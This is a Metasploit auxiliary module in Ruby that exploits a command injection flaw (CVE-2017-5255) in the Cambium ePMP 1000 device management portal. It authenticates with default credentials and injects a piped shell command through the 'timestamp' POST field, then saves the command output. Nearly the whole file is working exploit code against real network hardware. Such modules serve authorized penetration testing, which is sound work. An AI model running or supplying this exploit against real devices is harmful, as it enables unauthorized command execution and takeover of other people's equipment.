##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::EPMP

  def initialize(info = {})
    super(update_info(info,
      'Name' => "Cambium ePMP 1000 'get_chart' Command Injection (v3.1-3.5-RC7)",
      'Description' => %{
          This module exploits an OS Command Injection vulnerability in Cambium
          ePMP 1000 (v3.1-3.5-RC7) device management portal. It requires any one of the
          following login credentials - admin/admin, installer/installer, home/home - to
          execute arbitrary system commands.
      },
      'Author' =>
        [
          'Karn Ganeshen <KarnGaneshen[at]gmail.com>'
        ],
      'References' =>
        [
          ['CVE', '2017-5255'],
          ['URL', 'https://blog.rapid7.com/2017/12/19/r7-2017-25-cambium-epmp-and-cnpilot-multiple-vulnerabilities']
        ],
      'License' => MSF_LICENSE
     )
    )

    register_options(
      [
        Opt::RPORT(80),	# Application may run on a different port too. Change port accordingly.
        OptString.new('USERNAME', [true, 'A specific username to authenticate as', 'installer']),
        OptString.new('PASSWORD', [true, 'A specific password to authenticate with', 'installer']),
        OptString.new('CMD', [true, 'Command(s) to run', 'id; pwd'])
      ], self.class
    )

    deregister_options('DB_ALL_CREDS', 'DB_ALL_PASS', 'DB_ALL_USERS', 'USER_AS_PASS', 'USERPASS_FILE', 'USER_FILE', 'PASS_FILE', 'BLANK_PASSWORDS', 'BRUTEFORCE_SPEED', 'STOP_ON_SUCCESS')
  end

  def run_host(ip)
    unless is_app_epmp1000?
      return
    end
  end

  # Command Execution
  def cmd_exec(config_uri, cookie)
    command = datastore['CMD']
    inject = '|' + "#{command}"
    clean_inject = CGI.unescapeHTML(inject.to_s)

    print_status("#{rhost}:#{rport} - Executing #{command}")
    res = send_request_cgi(
      {
        'method' => 'POST',
        'uri' => config_uri,
        'cookie' => cookie,
        'headers' => {
          'Accept' => '*/*',
          'Accept-Language' => 'en-US,en;q=0.5',
          'Content-Encoding' => 'application/x-www-form-urlencoded; charset=UTF-8',
          'X-Requested-With' => 'XMLHttpRequest',
          'Connection' => 'close'
        },
        'vars_post' =>
          {
            'measure' => 's', # This parameter can also be used for injection
            'timestamp' => clean_inject,
            'debug' => 0
          }
      }, 25
    )

    good_response = (
      res &&
      res.code == 200
    )

    if good_response
      path = store_loot('ePMP_cmd_exec', 'text/plain', rhost, res.body, 'Cambium ePMP 1000 Command Exec Results')
      print_status("#{rhost}:#{rport} - Results saved in: #{path}")
    else
      print_error("#{rhost}:#{rport} - Failed to execute command(s).")
    end
  end

  #
  # Login & initiate cmd_exec
  #

  def do_login(epmp_ver)
    if (epmp_ver < '3.1' || epmp_ver > '3.5' && epmp_ver != '3.5-RC7')
      print_error('This module is applicable to versions 3.1-3.5-RC7 only. Exiting now.')
      return
    elsif (epmp_ver >= '3.1' && epmp_ver < '3.4.1') # <3.4.1 uses login_1
      cookie, _blah1, _blah2, config_uri_get_chart = login_1(datastore['USERNAME'], datastore['PASSWORD'], epmp_ver)
      if cookie == 'skip' && config_uri_get_chart == 'skip'
        return
      else
        cmd_exec(config_uri_get_chart, cookie)
      end
    elsif ['3.4.1', '3.5', '3.5-RC7'].include?(epmp_ver) # 3.4.1+ uses login_2
      cookie, _blah1, _blah2, config_uri_get_chart = login_2(datastore['USERNAME'], datastore['PASSWORD'], epmp_ver)
      if cookie == 'skip' && config_uri_get_chart == 'skip'
        return
      else
        cmd_exec(config_uri_get_chart, cookie)
      end
    end
  end
end
